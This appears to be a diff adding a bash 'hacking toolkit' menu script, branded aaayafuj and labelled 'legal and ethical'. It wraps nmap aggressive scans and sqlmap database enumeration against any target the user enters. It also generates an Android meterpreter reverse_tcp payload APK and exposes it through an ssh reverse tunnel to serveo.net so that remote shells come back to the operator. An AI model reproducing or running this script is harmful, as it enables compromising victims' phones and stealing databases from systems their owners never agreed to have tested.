@@ -1,0 +1,86 @@
+#!/bin/bash
+
+# ===============[ AAAYAFUJ HACKING TOOLS NETER ]===============
+# Legal, Ethical, and AI-powered Cybersecurity Toolkit
+
+banner() {
+clear
+echo -e "\e[1;91m
+███╗   ███╗ █████╗  █████╗ ██╗   ██╗ █████╗ ██╗   ██╗██╗███████╗
+████╗ ████║██╔══██╗██╔══██╗██║   ██║██╔══██╗██║   ██║██║██╔════╝
+██╔████╔██║███████║██║  ╚═╝██║   ██║███████║╚██╗ ██╔╝██║███████╗
+██║╚██╔╝██║██╔══██║██║  ██╗██║   ██║██╔══██║ ╚████╔╝ ██║╚════██║
+██║ ╚═╝ ██║██║  ██║╚█████╔╝╚██████╔╝██║  ██║  ╚██╔╝  ██║███████║
+╚═╝     ╚═╝╚═╝  ╚═╝ ╚════╝  ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝╚══════╝
+\e[0m"
+echo "             🔓 Legal Tools Only | © aaayafuj™"
+echo "------------------------------------------------------------"
+}
+
+install_dependencies() {
+    echo "[*] Installing dependencies..."
+    sudo apt update -y
+    sudo apt install nmap sqlmap metasploit-framework openssh curl wget git xdg-utils -y
+    echo "[*] Installation complete."
+}
+
+run_nmap() {
+    read -p "[+] Enter target IP or domain: " target
+    nmap -sS -A -T4 "$target"
+}
+
+run_sqlmap() {
+    read -p "[+] Enter target URL (with parameters): " url
+    sqlmap -u "$url" --dbs --batch
+}
+
+generate_payload() {
+    read -p "[+] Enter your Serveo subdomain (e.g. yourname): " sub
+    msfvenom -p android/meterpreter/reverse_tcp LHOST="$sub.serveo.net" LPORT=4444 -o payload.apk
+    echo "[*] Payload generated: payload.apk"
+    echo "[*] Now forwarding port using Serveo..."
+    ssh -R 4444:localhost:4444 "$sub"@serveo.net
+}
+
+launch_chat() {
+    xdg-open "https://net-aaa.aaayafuj.com"
+}
+
+open_marketplace() {
+    xdg-open "https://marketplace.aaayafuj.com"
+}
+
+update_tools() {
+    echo "[*] Updating aaayafuj tools..."
+    git pull origin main || echo "Make sure you're in a git directory!"
+    install_dependencies
+}
+
+main_menu() {
+    banner
+    echo "[1] Run Nmap Recon"
+    echo "[2] Start SQLMap Injection"
+    echo "[3] Generate Payload Link"
+    echo "[4] Launch Net AAA Chat (Legal)"
+    echo "[5] Open aaayafuj Marketplace"
+    echo "[6] Update Tools"
+    echo "[0] Exit"
+    echo ""
+    read -p "[?] Select option: " choice
+
+    case $choice in
+        1) run_nmap ;;
+        2) run_sqlmap ;;
+        3) generate_payload ;;
+        4) launch_chat ;;
+        5) open_marketplace ;;
+        6) update_tools ;;
+        0) echo "Goodbye! Stay legal, stay ethical." && exit ;;
+        *) echo "Invalid option. Try again." ;;
+    esac
+}
+
+# Run main menu in loop
+while true; do
+    main_menu
+done
